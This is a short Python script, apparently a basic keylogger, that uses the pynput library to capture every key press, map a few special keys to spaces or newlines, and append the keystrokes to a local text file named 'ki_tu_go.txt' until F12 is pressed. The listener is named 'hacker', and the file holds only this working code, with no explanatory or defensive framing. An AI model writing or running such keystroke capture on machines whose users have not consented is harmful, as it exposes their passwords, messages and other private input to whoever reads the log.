from pynput.keyboard import Listener

def anonymous(key):
    key = str(key)
    key = key.replace("'","")
    if key== "Key.f12":
        raise SystemExit(0)
    if key == "Key.ctrl_l": 
        key=" "
    if key == "Key.enter": 
        key="\n"
    if key == "Key.alt_l": 
        key=" "  
    if key == "Key.tab": 
       key=" "
    if key == "Key.shift": 
       key=" "
    if key == "Key.space": 
       key=" "
    if key == "Key.backspace": 
       key=" "
    with open("ki_tu_go.txt","a") as file:
        file.write(key)
    print(key)
    
with Listener(on_press=anonymous) as hacker:
    hacker.join()

    
